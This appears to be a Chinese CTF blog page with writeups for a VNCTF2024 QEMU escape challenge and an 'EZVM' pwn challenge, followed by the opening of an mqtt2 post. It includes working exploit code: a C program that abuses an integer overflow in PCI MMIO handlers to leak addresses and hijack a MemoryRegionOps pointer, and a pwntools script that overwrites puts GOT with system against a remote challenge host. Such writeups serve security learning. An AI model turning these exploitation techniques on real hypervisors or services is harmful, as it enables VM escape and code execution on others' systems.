<p>我将上面这个流程直白一点理解就是：在qemu容器中读写特定的base加偏移会触发pci设备特定的回调，逻辑中会操控qemu进程中的堆区域，如果其中存在漏洞，我们就能在容器里面通过内存读写触发qemu进程层面（相当于逃逸出了qemu容器）的漏洞。</p>
<blockquote>
<p>BAR是(Base Address Register，基地址寄存器)是 PCIe 设备用来向主机“申请”一段 MMIO（Memory-Mapped I&#x2F;O）地址空间的窗口；MMIO 区域则是主机把这段申请到的物理地址范围真正映射到设备内部寄存器或存储器之后，CPU 可见的那片“内存”区域。</p>
<p>具体流程：</p>
<ol>
<li>设备在上电&#x2F;枚举时把各 BAR 的低位 RO 字段填成“我需要 2^n 字节、32&#x2F;64 bit、可预取&#x2F;不可预取”等属性，高位可写位保持全 0。</li>
<li>BIOS&#x2F;OS 向 BAR 写全 1 再读回，根据第一个为 0 的位算出大小，然后在物理地址空间里找一段不冲突的区域，把起始地址写回 BAR。</li>
<li>从此，这段物理地址范围被标记为“MMIO 区域”，Root Complex 见到落在该范围的 TLP 就会转发给对应设备；对 CPU 来说，它就像一段普通内存，可用 load&#x2F;store 直接访问 。</li>
<li>设备内部逻辑把 BAR 基址与内部偏移做比对，匹配即认领事务，完成寄存器或显存等资源的读写 。</li>
</ol>
</blockquote>
<p>Guest Os层面的利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>((fd = open(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">mmio_base = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>通过查看pci设备的版本号，厂商获得相应的pci的mmio设备文件：<code>/sys/devices/pci0000:00/0000:00:04.0/resource0</code></p>
<p>再通过mmap映射将mmio的”物理地址”挂到GusetOS中exp的进程内存中，接下来可以根据题目中的设备驱动构造相应的读写函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>好了接下来复现一道qemu逃逸的CTF题目：VNCTF2024中一道题</p>
<blockquote>
<p>搭建qemu逃逸题目的调试环境：需要本地运行docker，同时在Dockerfile让容器提前下载好gdb(pwndbg配置太麻烦了)，运行run.sh跑起来目标qemu，用gdb attach上对应进程，开始愉快的调试</p>
<p>这里用两个终端分别运行docker容器：docker exec -ti 容器名字 &#x2F;bin&#x2F;bash</p>
</blockquote>
<p>首先分析对应pci设备的处理逻辑：</p>
<p><a href="1.png">!</a></p>
<p>对于读取逻辑来说，偏移存在两种情况:</p>
<ul>
<li>0x10:读取ptr+0xb80位置数据</li>
<li>0x20:读取ptr+[ptr+0xb80]+0xb40位置的数据</li>
</ul>
<p><a href="2.png">!</a></p>
<p>对于写入逻辑：</p>
<ul>
<li>0x30:如果ptr+0xb84为0，则写入值到ptr+0xb40+[ptr+0xb80]位置，并把ptr+0xb84置为1</li>
<li>0x10:如果写入内容小于0x3c<code>(存在整数溢出)</code>，将值写入ptr+0xb80处位置</li>
<li>0x20:对于内容取高32位数据(需要小于0x3c)，作为偏移，并将低32位内容写入ptr+0xb40+high(content)的位置</li>
</ul>
<blockquote>
<p>通过整数溢出我们能够读取-2 147 483 648  ≤  (ptr+0xb40）  ≤  60范围的值</p>
</blockquote>
<p>漏洞点就在利用整数溢出实现的越界数据读写来操控qemu进程内的堆空间，实现qemu的逃逸。</p>
<p>接下来看看ptr内存附近的内存都有些啥东西，这里列一下 <code>MemoryRegion</code>这个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;           <span class="comment">// QOM父对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 内存区域属性 */</span></span><br><span class="line">    <span class="type">uint64_t</span> size;               <span class="comment">// 区域大小</span></span><br><span class="line">    <span class="type">uint64_t</span> addr;               <span class="comment">// 映射地址（在AddressSpace中）</span></span><br><span class="line">    <span class="type">bool</span> mapped;                 <span class="comment">// 是否已映射</span></span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;      <span class="comment">// 脏页记录掩码</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 回调函数 */</span></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;  <span class="comment">// MMIO操作函数集</span></span><br><span class="line">    <span class="type">void</span> *opaque;                <span class="comment">// 传递给回调函数的不透明指针</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 内存区域关系 */</span></span><br><span class="line">    MemoryRegion *container;     <span class="comment">// 所属容器（如有）</span></span><br><span class="line">    Int128 size_int128;          <span class="comment">// 128位大小（支持超大内存）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 内存类型标志 */</span></span><br><span class="line">    RAMBlock *ram_block;         <span class="comment">// 如果是RAM，指向RAMBlock</span></span><br><span class="line">    <span class="type">bool</span> ram;                    <span class="comment">// 是否为RAM区域</span></span><br><span class="line">    <span class="type">bool</span> rom;                    <span class="comment">// 是否为ROM区域</span></span><br><span class="line">    <span class="type">bool</span> readonly;               <span class="comment">// 是否只读</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;            <span class="comment">// 是否非易失性</span></span><br><span class="line">    <span class="type">bool</span> rom_device;             <span class="comment">// 是否为ROM设备</span></span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;   <span class="comment">// 是否合并MMIO刷新</span></span><br><span class="line">    <span class="type">bool</span> global_locking;         <span class="comment">// 是否全局锁定</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 子区域链表 */</span></span><br><span class="line">    QTAILQ_HEAD(subregions, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 地址空间链表 */</span></span><br><span class="line">    QTAILQ_HEAD(coalesced_ranges, CoalescedMemoryRange) coalesced;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) addr_search_link;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们关注其中的<code>const MemoryRegionOps *ops</code>,如果能够控制这个结构体地址指向我们控制的地址，就能在执行 vn_mmio_read 和 vn_mmio_write 时去执行 我们地址上 指向的函数。在ida中搜索&#x2F;bin&#x2F;sh，查看交叉引用可以找到一个后门函数地址：<code>0x67429B</code></p>
<p><a href="3.png">!</a></p>
<p>那么现在存在两个目标:</p>
<ul>
<li>泄露qemu进程的pie地址</li>
<li>修改MemoryRegion中ops指针到我们能够控制的地址并将其指向后门函数</li>
</ul>
<p>通过遍历查找我们可以读的偏移找到pie地址，求出pie_base，同时对应偏移上能够修改到对应的MemoryRegion中的ops指针</p>
<p>下面是exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define MAP_SIZE 4096UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_path=<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"><span class="type">uint64_t</span> mmio_base;</span><br><span class="line"><span class="comment">//将设备文件映射到内存中进行操作</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">getMMIOBase</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>((fd = open(pci_path, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">mmio_base= mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>); <span class="comment">//映射bar</span></span><br><span class="line"><span class="keyword">if</span>(mmio_base == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>* <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> offsest)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + offsest));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line">getMMIOBase();<span class="comment">//打开设备文件，并映射内存</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line"><span class="comment">//根据泄露对应的pie地址数据</span></span><br><span class="line">mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span>);</span><br><span class="line"><span class="type">uint64_t</span> pie_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="type">uint64_t</span> pie_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">uint64_t</span> pie = pie_low + (pie_high &lt;&lt; <span class="number">32</span>) - <span class="number">0x82B35B</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pie = 0x%llx\n&quot;</span>, pie);</span><br><span class="line">  </span><br><span class="line">getchar();</span><br><span class="line"><span class="comment">//泄露堆地址数据</span></span><br><span class="line">mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span>);</span><br><span class="line"><span class="type">uint64_t</span> heap_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="type">uint64_t</span> heap_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">uint64_t</span> heap = heap_low + (heap_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap = 0x%llx\n&quot;</span>, heap);</span><br><span class="line"><span class="type">uint64_t</span> backdoor = pie + <span class="number">0x67429B</span>;</span><br><span class="line"><span class="type">uint64_t</span> system_plt_addr = heap + <span class="number">0x60</span> + <span class="number">8</span>;</span><br><span class="line"><span class="type">uint64_t</span> cmdaddr = heap + <span class="number">0x58</span> + <span class="number">8</span>;</span><br><span class="line">getchar();</span><br><span class="line"><span class="comment">//伪造ops结构体，其中read指针指向后门函数</span></span><br><span class="line">mmio_write_idx(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">mmio_write_idx(<span class="number">12</span>,<span class="number">0x67616C66</span>);</span><br><span class="line">mmio_write_idx(<span class="number">16</span>,backdoor &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">mmio_write_idx(<span class="number">20</span>,backdoor &gt;&gt; <span class="number">32</span>);</span><br><span class="line">mmio_write_idx(<span class="number">24</span>,system_plt_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">mmio_write_idx(<span class="number">28</span>,system_plt_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">mmio_write_idx(<span class="number">32</span>,cmdaddr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">mmio_write_idx(<span class="number">36</span>,cmdaddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">40</span>;i &lt;= <span class="number">60</span> ;i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">mmio_write_idx(i,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="comment">//将memoryregion中的ops指针改到堆上伪造好的地址</span></span><br><span class="line">mmio_write(<span class="number">0x10</span>,<span class="number">-0xc0</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="comment">//触发对应函数</span></span><br><span class="line">mmio_write(<span class="number">0x30</span>,system_plt_addr);</span><br><span class="line">getchar();</span><br><span class="line">mmio_read(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="本题总结"><a href="#本题总结" class="headerlink" title="本题总结"></a>本题总结</h3><p>本质上题目在有漏洞的mmio逻辑中实现越界读写，通过越界读写篡改到qemu中一个存储在堆空间的特殊结构体：MemoryRegion，从而劫持程序流。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">EZVM做题记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-11-12 08:02:32 / 修改时间：08:46:03" itemprop="dateCreated datePublished" datetime="2025-11-12T08:02:32+08:00">2025-11-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在fnz比赛中，遇到一道对于本人现阶段较有挑战性的一道VM题，这里记录一下做题的过程。</p>
<blockquote>
<p>VM题目一般会用程序语言去模拟某些解释器性质功能，往往拥有较大的代码量，需要逆向去还原题目的指令集功能以及解释器相关的结构体等</p>
</blockquote>
<p>题目是EZVM，打开时看看保：没开pei，Partial RELRO，其他保护全开。libc版本来到了2.35，每次给了libc的题目可以利用<code>strings libc.so.6 | grep &quot;ubuntu&quot;</code>来看一下题目给的libc版本，特别是有堆利用的题目。</p>
<p>ida打开程序，总览main函数，交互包括读取name，opcode，data，并进入一个类似于操作opcode与data的解析函数，根据返回值去调用输出name与输出data的函数。这个题目存在一个比较关键的结构，其管理了一个模拟的栈，其对应的成员如图：<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">。题目中有些关键的栈操作函数如果不在ida中转化变量为结构体还是很难逆的。<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2.png">这里实现了栈的push功能。关键逻辑还是在解析函数中，对于存储opcode的栈依次弹栈并switch_case判断opecode跳到不同操作函数中(已经算是非常直接的解析逻辑了。<img src="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/3.png"></p>
<p>这里关注两个函数:push_align与write_align</p>
<ul>
<li>push_align会pop work_arena栈顶值作为相对当前栈顶的偏移push对应位置的8字节内容</li>
<li>write_align会分别pop write_content与align作为写入地址以及相对当前栈顶的偏移</li>
</ul>
<p>观察程序发现三个栈都处于堆中，其实不难发现我具有堆空间内的任意地址读写。初步想法是寻找堆区域的libc地址，对地址做操作打__free_hook(当时忘记是libc3.35了。。)。然而因为执行解析操作时堆结构并没有free的unsorted_bin，堆空间也就没有libc地址可以用了。再次观察堆空间有的堆块：除了三个栈本体与存name的chunk，还有三个my_stack管理结构。而对于栈的实体的定位取决于第一个字长数据，将work_area栈管理结构中指针改到pei中地址，相当于实现了ELF文件的任意读写。不难想到直接劫持got表是最直接的方法，刚好后续会puts一个我们控制指向内容的name指针。直接name为&#x2F;bin&#x2F;sh即可！</p>
<blockquote>
<p>补充：注意题目的交互方式，opcode逐字节进行了特定处理，data对输入数字进行字节转换，并以空格分隔每个数字</p>
</blockquote>
<p>Exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">40894</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#虚拟逻辑：opcode前后4字交换 Data存数字对应字节码</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;opcode： </span></span><br><span class="line"><span class="string">0x45 弹data到操作区</span></span><br><span class="line"><span class="string">0x65 弹操作区到data</span></span><br><span class="line"><span class="string">0xC5 加</span></span><br><span class="line"><span class="string">0x21 减</span></span><br><span class="line"><span class="string">0x23 除</span></span><br><span class="line"><span class="string">0x14 乘</span></span><br><span class="line"><span class="string">0x25 按照栈顶索引改写数据</span></span><br><span class="line"><span class="string">0x46 按照栈顶索引读数据到操作区栈顶</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">思路：</span></span><br><span class="line"><span class="string">构造opcode：先写操作栈指针为bss位置，任意读数据读取puts_got值，将data_push到操作栈上，进行运算实现system，写到puts_got位置，最后puts(name)实现getshell</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got=<span class="number">0x405020</span></span><br><span class="line">align_got=<span class="number">0x300e0</span></span><br><span class="line"><span class="comment"># align_bss=</span></span><br><span class="line">bss=puts_got+<span class="number">0x400</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name :)\n&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;OPCODE :)\n&#x27;</span>,<span class="string">b&#x27;\x45\x45\x25\x45\x45\x46\x21\x45\x25&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;DATA :)\n&#x27;</span>,<span class="built_in">str</span>(bss).encode()+<span class="string">b&#x27; -3 &#x27;</span>+<span class="built_in">str</span>(align_got).encode()+<span class="string">b&#x27; -128 -127&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">mqtt2做题记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-11-11 13:48:36 / 修改时间：15:20:17" itemprop="dateCreated datePublished" datetime="2025-11-11T13:48:36+08:00">2025-11-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>ldz师傅分享了一道有趣的题目，在做题过程中本人收获颇丰，接触到了许多新的知识点，记录一下做题(学习过程)</p>
</blockquote>
<h2 id="前置知识学习"><a href="#前置知识学习" class="headerlink" title="前置知识学习"></a>前置知识学习</h2><p>在做题中接触的新知识较多，理解这些知识是搞懂题目逻辑的关键点，这里在篇首回顾一遍流程中学习的内容</p>
